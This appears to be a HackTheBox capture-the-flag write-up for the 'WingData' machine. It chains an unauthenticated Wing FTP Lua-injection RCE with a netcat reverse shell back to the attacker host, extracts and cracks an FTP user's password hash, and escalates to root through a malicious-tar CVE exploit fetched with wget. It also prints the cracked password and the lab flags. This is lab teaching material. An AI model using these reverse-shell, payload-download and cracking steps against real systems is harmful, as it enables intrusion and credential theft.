---
title: "WingData"
platform: HTB
difficulty: Easy
so: Linux
fecha: 2026-04-23
fecha_lanzamiento: 2026-02-14
fecha_completado: 2026-04-23
tags: [CVE-2025-47812, RCE, Lua, CVE-2025-4517, Privilege Escalation]
desc: "Unauthenticated RCE in Wing FTP Server v7.4.3 (CVE-2025-47812) and privilege escalation abusing python tar extraction (CVE-2025-4517)."
---

# WingData — HackTheBox

## 1. Reconnaissance (Enumeration)

The initial scan revealed two open ports: SSH (22) and HTTP (80). The web service redirects to the virtual host `wingdata.htb`. Navigating to the **Client Portal** section reveals the subdomain `ftp.wingdata.htb`, which hosts an instance of **Wing FTP Server v7.4.3**.

```bash
nmap -sCV -A 10.129.23.52
# Add to /etc/hosts:
echo "10.129.23.52 wingdata.htb ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

---

## 2. Vulnerability Analysis (The Logic)

The attack chain was based on three vulnerabilities:

1. **CVE-2025-47812 (Unauthenticated RCE):** Wing FTP Server v7.4.3 allows Lua code injection in the `username` parameter using a NULL byte, achieving command execution without credentials.

2. **Cleartext Credentials (relative):** Wing FTP Server stores FTP user hashes in local XML files (`/opt/wftpserver/Data/1/users/`), using the format `sha256(pass + "WingFTP")`, which can be cracked with hashcat.

3. **CVE-2025-4517 (Escalation via malicious tar):** The `/opt/backup_clients/restore_backup_clients.py` script, executable as root via sudo, extracts `.tar` archives without validating symlinks or hardlinks, allowing `/etc/sudoers` to be overwritten.

---

## 3. Exploitation (Exploitation)

#### A. Foothold — CVE-2025-47812 (Unauthenticated RCE)

```bash
# Clone the exploit
git clone https://github.com/4m3rr0r/CVE-2025-47812-poc.git
cd CVE-2025-47812-poc

# Start listener
nc -lvnp 5555

# Launch the exploit
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc 10.10.15.100 5555 -e /bin/bash" -v
```

We get a shell as `wingftp`. Upgrading the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

#### B. Credential Extraction

```bash
# Locate wacky user file
cat /opt/wftpserver/Data/1/users/wacky.xml
# Hash found:
# 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

#### C. Cracking the hash (hashcat mode 1410)

```bash
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > wacky_hash.txt
hashcat -m 1410 wacky_hash.txt /usr/share/wordlists/rockyou.txt
# Result: !#7Blushing^*Bride5
```

#### D. Lateral Movement — SSH as wacky

```bash
ssh wacky@10.129.23.52
# Password: !#7Blushing^*Bride5
cat user.txt
```

---

## 4. Privilege Escalation — CVE-2025-4517

```bash
# View sudo privileges
sudo -l
# (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *

# On attacker machine: clone exploit and serve
git clone https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData.git
cd CVE-2025-4517-POC-HTB-WingData
python3 -m http.server 8000

# On victim: download and execute
cd /tmp
wget http://10.10.15.100:8000/CVE-2025-4517-POC.py
python3 /tmp/CVE-2025-4517-POC.py
# When it asks "Spawn root shell now?": y

# Get root flag
cd /root
cat root.txt
```

---

## 5. Flags

> [!SUCCESS] 🚩 User Flag
> `5df7ada4dbde9b2a8d99530acf7353be`

> [!SUCCESS] 🚩 Root Flag
> `45546ba63830ea3caf617d523f7ffec6`

---

### 6. Attack chain summary

```
ftp.wingdata.htb (Wing FTP v7.4.3)
        ↓
CVE-2025-47812 → Unauth RCE → shell as wingftp
        ↓
/opt/wftpserver/Data/1/users/wacky.xml → SHA256 hash + salt
        ↓
hashcat -m 1410 → !#7Blushing^*Bride5
        ↓
SSH as wacky → user.txt
        ↓
sudo -l → backup script executable as root
        ↓
CVE-2025-4517 → malicious tar → overwrites /etc/sudoers
        ↓
sudo /bin/bash → root → root.txt
```
